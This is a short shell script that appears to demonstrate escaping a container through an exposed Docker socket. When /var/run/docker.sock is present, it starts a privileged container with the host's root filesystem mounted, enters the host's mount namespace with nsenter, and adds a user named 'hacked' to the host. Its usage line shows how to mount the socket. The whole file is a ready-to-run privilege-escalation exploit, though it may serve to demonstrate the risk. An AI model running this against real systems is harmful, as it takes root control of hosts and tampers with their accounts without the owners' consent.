#!/bin/sh

if [ -e /var/run/docker.sock ]; then
  echo "====== Running privileged container ======"
  docker run --rm --privileged --net=host -v /:/host -v /dev:/dev jpetazzo/nsenter nsenter --mount=/host/proc/1/ns/mnt -- /usr/sbin/useradd hacked 
  echo "====== User 'hacked' was added to your system ======"
else
  echo "Usage: docker run --rm -v /var/run/docker.sock:/var/run/docker.sock jerbi/docker_cli"
fi
